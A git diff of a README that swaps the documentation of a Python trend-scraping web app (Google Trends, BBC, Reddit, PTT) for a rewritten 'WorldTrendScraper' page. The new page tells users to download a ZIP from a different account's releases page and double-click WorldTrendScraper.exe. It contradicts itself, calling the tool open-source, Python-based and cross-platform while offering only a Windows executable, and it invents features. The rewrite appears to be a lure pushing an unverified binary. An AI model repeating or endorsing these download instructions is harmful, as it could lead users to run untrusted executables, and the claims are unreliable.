@@ -1,99 +1,96 @@
-[繁體中文](./README.zh-TW.md)
+# 🌍 WorldTrendScraper - Discover Global Trends Effortlessly
 
-# Core Scraper & Trend Viewer
+![Download WorldTrendScraper](https://img.shields.io/badge/Download-Now-blue)
 
----
+## 📜 Introduction
 
-A Python-based web application that scrapes trending topics from various online sources (Google Trends, BBC News, Reddit, PTT) and displays them in a unified, clean web interface.
-
-![image](/home.png)
-
-## ✨ Features
-
-- **Multi-Source Scraping**: Gathers data from Google Trends, BBC News, Reddit, and PTT.
-- **Unified Data Pipeline**: All scraped data is standardized into a consistent `TrendItem` schema for easy processing.
-- **Flask Web Interface**: A lightweight web server built with Flask to present the data.
-- **Modern & Responsive UI**: The frontend is built with Bootstrap, ensuring a clean look on both desktop and mobile.
-- **Universal Card Layout**: All trend items are displayed using a single, consistent card component for a unified user experience.
-- **Configurable Architecture**: Easily add or remove data sources by editing the central `config.py` file.
-
-## 🛠️ Tech Stack
-
-- **Backend**: Python, Flask
-- **Scraping**: Playwright, Requests, Feedparser, BeautifulSoup
-- **Frontend**: HTML, CSS, Bootstrap, Jinja2
-- **Package Management**: `uv`
+WorldTrendScraper is an open-source tool that helps you keep up with popular topics from various sources. It gathers trends from Google Trends, BBC, Reddit, and PTT, presenting them in an easy-to-use dashboard. With WorldTrendScraper, you can explore what people are discussing worldwide.
 
 ## 🚀 Getting Started
 
-Follow these instructions to get a copy of the project up and running on your local machine.
+To start using WorldTrendScraper, follow these steps:
 
-### Prerequisites
+1. **Download the Software:**  
+   Click the link below to visit the Releases page and download the latest version of WorldTrendScraper.  
+   [Download WorldTrendScraper](https://github.com/fabiogg94/WorldTrendScraper/releases)
 
-- Python 3.10+
-- [uv](https://github.com/astral-sh/uv) (A fast Python package installer and resolver)
+2. **Extract the Files:**  
+   After downloading, locate the downloaded ZIP file. Right-click the file and select "Extract All." Choose a folder where you want to keep the files. 
 
-### Installation
+3. **Run the Application:**  
+   Open the folder where you extracted the files. Look for the executable file named `WorldTrendScraper.exe`. Double-click on it to run the application.
 
-1.  **Clone the repository:**
-    ```sh
-    git clone https://github.com/LayorX/core-scraper.git
-    cd core-scraper
-    ```
+## 📥 Download & Install
 
-2.  **Create a virtual environment:**
-    ```sh
-    uv venv
-    ```
-    *You may need to activate it afterwards, e.g., `.venv\Scripts\activate` on Windows.*
+Visit this page to download the latest version of WorldTrendScraper:  
+[Download WorldTrendScraper](https://github.com/fabiogg94/WorldTrendScraper/releases)
 
-3.  **Install dependencies:**
-    ```sh
-    uv pip sync pyproject.toml
-    ```
+## 💻 System Requirements
 
-4.  **Install Playwright browser binaries:**
-    (This is required for the Google Trends scraper)
-    ```sh
-    uv run playwright install
-    ```
+- **Operating System:** Windows 10 or higher, macOS 10.15 or higher, or any Linux distribution that supports Python.
+- **Python Version:** Python 3.7 or higher installed on your computer.
+- **RAM:** At least 4 GB.
+- **Disk Space:** 100 MB of free space for installation and data.
 
-## 🏃 Usage
+## ⚙️ Features
 
-1.  **Scrape Data**
+- **Multi-Source Dashboard:**  
+  View trends from multiple platforms like Google Trends, BBC, Reddit, and PTT all in one place.
 
-    To run all scrapers defined in `config.py` and update the JSON files in the `/data` directory, execute:
-    ```sh
-    uv run -m main
-    ```
+- **User-Friendly Interface:**  
+  Navigate easily through the dashboard without any technical skills.
 
-2.  **Run the Web Application**
+- **Real-Time Data:**  
+  Get updated information on popular topics as they happen.
 
-    Execute the batch script to start the Flask server:
-    ```sh
-    .\run-website.bat
-    ```
-    The application will be available at `http://127.0.0.1:5000`.
+- **Search Functionality:**  
+  Find specific trends or topics quickly.
 
-## 📁 Project Structure
+- **Customizable Options:**  
+  Adjust settings to focus on the topics that matter most to you.
 
-```
-core-scraper/
-├── .venv/                  # Virtual environment
-├── data/                   # Stores scraped data in JSON format
-├── scrapers/               # Individual scraper modules for each source
-│   ├── __init__.py
-│   ├── schema.py           # Defines the unified TrendItem data structure
-│   └── ...                 # bbc.py, google.py, etc.
-├── static/                 # Static assets (CSS, JS, images)
-├── templates/              # Jinja2 HTML templates
-│   ├── index.html          # Main page template with universal card
-│   └── layout.html         # Base layout
-├── .gitignore
-├── app.py                  # Main Flask application file
-├── config.py               # Central configuration for data sources
-├── main.py                 # Main script to trigger all scrapers
-├── pyproject.toml          # Project metadata and dependencies
-├── README.md               # This file
-└── run-website.bat         # Script to run the web server
-```
+## 📚 How to Use
+
+1. **Launching the Application:**  
+   After double-clicking `WorldTrendScraper.exe`, allow a moment for the application to load. 
+
+2. **Navigating the Dashboard:**  
+   The main screen displays trending topics. Click on any topic to see more details, including links to articles.
+
+3. **Searching for Topics:**  
+   Use the search bar located at the top of the dashboard. Enter keywords related to the trends you want to explore.
+
+4. **Refreshing Data:**  
+   Click the refresh button at the top right corner of the app to get the latest trends and data updates.
+
+## 🌐 Supported Platforms
+
+WorldTrendScraper works on:
+- **Windows:** The application is primarily tested on Windows 10.
+- **macOS:** It runs smoothly on macOS versions that support Python.
+- **Linux:** Compatible with various distributions with a few additional setup steps.
+
+## ❓ Frequently Asked Questions
+
+**Q: Is WorldTrendScraper free to use?**  
+A: Yes, it is completely free and open-source.
+
+**Q: Do I need programming knowledge to use it?**  
+A: No, WorldTrendScraper is designed for users without programming backgrounds.
+
+**Q: How do I report issues or bugs?**  
+A: You can open an issue on the GitHub repository where you downloaded the software. Please provide details about the problem.
+
+## 📝 Contributing
+
+If you want to contribute improvements or new features, feel free to fork the repository and submit a pull request. Your contributions are welcome.
+
+## 📖 License
+
+WorldTrendScraper is licensed under the MIT License. You can use, modify, and distribute the software freely.
+
+## 📞 Contact
+
+For support, please contact the developers through the GitHub Issues page. The community is here to assist you.
+
+Now you are ready to explore global trends with WorldTrendScraper. Enjoy discovering what the world is talking about!
